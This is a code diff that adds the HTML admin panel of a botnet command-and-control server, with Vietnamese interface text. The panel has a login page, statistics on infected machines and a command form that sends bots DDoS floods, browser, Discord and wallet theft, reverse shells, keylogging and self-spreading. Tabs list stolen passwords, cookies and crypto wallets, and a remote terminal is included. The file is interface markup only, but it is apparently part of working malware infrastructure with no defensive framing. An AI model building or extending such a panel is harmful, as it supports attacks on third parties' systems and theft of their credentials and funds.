@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Botnet - Admin Panel</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body class="dark-theme">
+    <!-- Trang dang nhap -->
+    <div id="login-page" class="login-container">
+        <div class="login-box">
+            <h1>C2 BOTNET</h1>
+            <h3>Admin Panel</h3>
+            <form id="login-form">
+                <div class="form-group">
+                    <label for="username">Tên đăng nhập</label>
+                    <input type="text" id="username" name="username" placeholder="admin" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Mật khẩu</label>
+                    <input type="password" id="password" name="password" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn btn-primary">Đăng nhập</button>
+                <p id="login-error" class="error-message" style="display:none;"></p>
+            </form>
+        </div>
+    </div>
+
+    <!-- Dashboard chinh -->
+    <div id="dashboard" class="dashboard-container" style="display:none;">
+        <!-- Header -->
+        <header class="main-header">
+            <div class="header-left">
+                <h2>C2 Botnet Control Panel</h2>
+            </div>
+            <div class="header-right">
+                <span id="server-time">00:00:00</span>
+                <button id="btn-logout" class="btn btn-danger">Đăng xuất</button>
+            </div>
+        </header>
+
+        <!-- Navigation -->
+        <nav class="main-nav">
+            <a href="#" class="nav-item active" data-tab="overview">Tổng quan</a>
+            <a href="#" class="nav-item" data-tab="bots">Danh sách Bot</a>
+            <a href="#" class="nav-item" data-tab="commands">Lệnh</a>
+            <a href="#" class="nav-item" data-tab="steals">Dữ liệu Steal</a>
+            <a href="#" class="nav-item" data-tab="terminal">Terminal</a>
+        </nav>
+
+        <!-- Main content area -->
+        <main class="main-content">
+            <!-- Tab Tổng quan -->
+            <div id="tab-overview" class="tab-content active">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <h4>Tổng số Bot</h4>
+                        <span id="stat-total-bots" class="stat-number">0</span>
+                    </div>
+                    <div class="stat-card stat-online">
+                        <h4>Online</h4>
+                        <span id="stat-online-bots" class="stat-number">0</span>
+                    </div>
+                    <div class="stat-card stat-offline">
+                        <h4>Offline</h4>
+                        <span id="stat-offline-bots" class="stat-number">0</span>
+                    </div>
+                    <div class="stat-card">
+                        <h4>Tổng lệnh</h4>
+                        <span id="stat-total-commands" class="stat-number">0</span>
+                    </div>
+                    <div class="stat-card">
+                        <h4>Dữ liệu Steal</h4>
+                        <span id="stat-total-steals" class="stat-number">0</span>
+                    </div>
+                </div>
+                <div class="chart-grid">
+                    <div class="chart-container">
+                        <h4>Phân bố theo quốc gia</h4>
+                        <div id="chart-countries" class="bar-chart"></div>
+                    </div>
+                    <div class="chart-container">
+                        <h4>Phân bố Hệ điều hành</h4>
+                        <div id="chart-os" class="bar-chart"></div>
+                    </div>
+                </div>
+                <div class="realtime-log">
+                    <h4>Log thời gian thực</h4>
+                    <div id="realtime-log-box" class="log-box"></div>
+                </div>
+            </div>
+
+            <!-- Tab Danh sách Bot -->
+            <div id="tab-bots" class="tab-content">
+                <div class="filter-bar">
+                    <input type="text" id="filter-search" placeholder="Tìm kiếm hostname, IP..." class="input-field">
+                    <select id="filter-status" class="input-field">
+                        <option value="">Tất cả trạng thái</option>
+                        <option value="online">Online</option>
+                        <option value="offline">Offline</option>
+                    </select>
+                    <button id="btn-filter" class="btn btn-primary">Lọc</button>
+                </div>
+                <table class="data-table" id="bots-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Hostname</th>
+                            <th>OS</th>
+                            <th>IP</th>
+                            <th>Quốc gia</th>
+                            <th>Last Seen</th>
+                            <th>Trạng thái</th>
+                            <th>Hành động</th>
+                        </tr>
+                    </thead>
+                    <tbody id="bots-table-body"></tbody>
+                </table>
+            </div>
+
+            <!-- Tab Lệnh -->
+            <div id="tab-commands" class="tab-content">
+                <div class="command-panel">
+                    <div class="command-form">
+                        <h4>Gửi lệnh mới</h4>
+                        <select id="cmd-bot-select" class="input-field">
+                            <option value="all">Tất cả Bot Online</option>
+                        </select>
+                        <select id="cmd-module" class="input-field">
+                            <option value="ddos">DDoS</option>
+                            <option value="stealer">Stealer</option>
+                            <option value="remote">Remote Access</option>
+                            <option value="spreader">Spreader</option>
+                        </select>
+                        <select id="cmd-action" class="input-field">
+                            <!-- DDoS -->
+                            <optgroup label="DDoS Layer 7">
+                                <option value="http_flood">HTTP Flood</option>
+                                <option value="slowloris">Slowloris</option>
+                                <option value="http2_rst">HTTP/2 RST</option>
+                            </optgroup>
+                            <optgroup label="DDoS Layer 4">
+                                <option value="syn_flood">SYN Flood</option>
+                                <option value="udp_flood">UDP Flood</option>
+                                <option value="tcp_flood">TCP Connection Flood</option>
+                            </optgroup>
+                            <optgroup label="DDoS Layer 3">
+                                <option value="icmp_flood">ICMP Flood</option>
+                                <option value="dns_amp">DNS Amplification</option>
+                            </optgroup>
+                            <optgroup label="Stealer">
+                                <option value="steal_browser">Steal Browser</option>
+                                <option value="steal_discord">Steal Discord</option>
+                                <option value="steal_wallets">Steal Wallets</option>
+                                <option value="steal_system">Steal System Info</option>
+                            </optgroup>
+                            <optgroup label="Remote">
+                                <option value="reverse_shell">Reverse Shell</option>
+                                <option value="screenshot">Screenshot</option>
+                                <option value="keylogger">Keylogger</option>
+                            </optgroup>
+                        </select>
+                        <input type="text" id="cmd-params" class="input-field" placeholder="Tham số JSON">
+                        <button id="btn-send-command" class="btn btn-danger">Gửi lệnh</button>
+                    </div>
+                </div>
+                <table class="data-table" id="commands-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Bot</th>
+                            <th>Module</th>
+                            <th>Action</th>
+                            <th>Trạng thái</th>
+                            <th>Thời gian</th>
+                        </tr>
+                    </thead>
+                    <tbody id="commands-table-body"></tbody>
+                </table>
+            </div>
+
+            <!-- Tab Dữ liệu Steal -->
+            <div id="tab-steals" class="tab-content">
+                <div class="filter-bar">
+                    <select id="steal-filter-type" class="input-field">
+                        <option value="">Tất cả loại</option>
+                        <option value="passwords">Passwords</option>
+                        <option value="cookies">Cookies</option>
+                        <option value="wallets">Wallets</option>
+                        <option value="discord">Discord</option>
+                        <option value="telegram">Telegram</option>
+                        <option value="system">System Info</option>
+                    </select>
+                    <button id="btn-filter-steals" class="btn btn-primary">Lọc</button>
+                </div>
+                <div id="steals-data-container" class="data-grid"></div>
+            </div>
+
+            <!-- Tab Terminal -->
+            <div id="tab-terminal" class="tab-content">
+                <div class="terminal-container">
+                    <div id="terminal-output" class="terminal-output"></div>
+                    <div class="terminal-input-row">
+                        <span class="terminal-prompt">admin@c2:~$</span>
+                        <input type="text" id="terminal-input" class="terminal-input" placeholder="Nhập lệnh...">
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="/app.js"></script>
+</body>
+</html>
